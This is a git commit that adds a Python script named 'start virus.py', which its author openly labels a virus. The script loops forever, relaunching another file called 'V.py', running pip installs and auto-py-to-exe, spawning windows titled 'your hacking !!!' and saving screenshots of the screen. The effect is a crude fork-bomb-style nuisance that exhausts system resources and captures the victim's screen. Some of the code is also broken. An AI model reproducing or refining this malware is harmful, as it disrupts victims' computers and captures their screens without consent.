0519342f34e537d10cb2ef1cb3adea3a9c9a0372
Evil with angel morality <106548856+Evil-with-angel-morality@users.noreply.github.com>
2022-06-10 15:42:38 -0700

    Virus file and required script
    Virus file and required script

---
+++ Virous/start virus.py
@@ -0,0 +1,33 @@
+import os
+from tkinter import *
+from PIL import ImageGrab
+
+
+os.system('pip install os')
+os.system('pip install pillow')
+os.system('pip install auto-py-to-exe')
+
+def plus ():
+    while True:
+        os.startfile("V.py")
+        window = Tk()
+        window.title('your hacking !!!')
+        window.minsize(900,800)
+        window.maxsize(900,800)
+        window.resizable(width=False,height=False)
+        Button(window, text='No !!!').pack()
+
+
+
+while True:
+    os.startfile("V.py")
+    os.system('auto-py-to-exe')
+    window = Tk()
+    window.title('your hacking !!!')
+    window.minsize(900,800)
+    window.maxsize(900,800)
+    window.resizable(width=False,height=False)
+    Button(window, text='your hacking !!!', command=plus).pack()
+    sc = ImageGrab.grab()
+    sc.save('your hacking!!!.png')
+#    time.sleep(5)
